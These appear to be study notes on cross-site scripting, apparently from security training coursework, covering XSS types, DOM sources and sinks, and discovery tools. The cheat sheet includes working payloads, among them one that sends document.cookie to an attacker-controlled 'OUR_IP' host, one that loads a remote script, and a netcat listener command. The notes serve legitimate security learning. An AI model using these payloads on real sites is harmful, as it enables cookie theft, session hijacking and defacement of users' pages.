# Cross Site Scripting (XSS) Notes

Execution of JavaScript code in an input field. Inherently a client focused vulnerability and can be equated to a medium risk.

|Type| 	Description|
|:----|:----|
|Stored (Persistent) XSS 	|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|Reflected (Non-Persistent) XSS 	|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|DOM-based XSS 	|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

## Cheat Sheet

|Code 	|Description|
|:----|:----|
|XSS| Payloads 	|
|<script>alert(window.origin)</script> 	|Basic XSS Payload|
|<plaintext> |	Basic XSS Payload|
|<script>print()</script> |	Basic XSS Payload|
|<img src="" onerror=alert(window.origin)> 	|HTML-based XSS Payload|
|<script>document.body.style.background = "#141d2b"</script> 	|Change Background Color|
|<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> |	Change Background Image|
|<script>document.title = 'HackTheBox Academy'</script> 	|Change Website Title|
|<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script> 	|Overwrite website's main body|
|<script>document.getElementById('urlform').remove();</script> 	|Remove certain HTML element|
|<script src="http://OUR_IP/script.js"></script>| 	Load remote script|
|<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script> 	|Send Cookie details to us
Commands 	|
|python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 	|Run xsstrike on a url parameter|
|sudo nc -lvnp 80 	|Start netcat listener|
|sudo php -S 0.0.0.0:80 	|Start PHP server|


## Stored XSS

If the value gets stored in say the DB and is pulled up for any user it's stored.

Typical payload
```
<script>alert('1')</script>
```

## Reflected XSS

Only displayed for the current user, usually from input placed in. Perfect for phishing or csrf type of attacks.

Display cookie values

```
<script>alert(document.cookie)</script>
```

## DOM XSS

While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

For DOM XSS there are two definitions to understand. The `Source` is the JavaScript object that takes the user input, and it can be any input parameter. The `Sink` is the function that writes the user input to a DOM Object. If the Sink doesn't properly sanitize the input we could get XSS. Common DOM objects:
- document.write()
- DOM.innerHTML
- DOM.outerHTML

JQuery functions that write to the DOM:
- add()
- after()
- append()

Other payload

```
<img src="" onerror=alert(window.origin)>
```

## XSS Discovery 

### Automated

We can use automated tools like Nessus, Burp Pro, or ZAP

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try XSS Strike by cloning it to our VM with git clone

```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

### Manual

Payload lists: 
- [Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [xss-payload-list](https://github.com/payloadbox/xss-payload-list)

Using fuzzers like ffuf we can take these lists and test parameters like this.


### Code Review

Reviewing code would be the quickest way to check, but requires access to the code for it to work. 

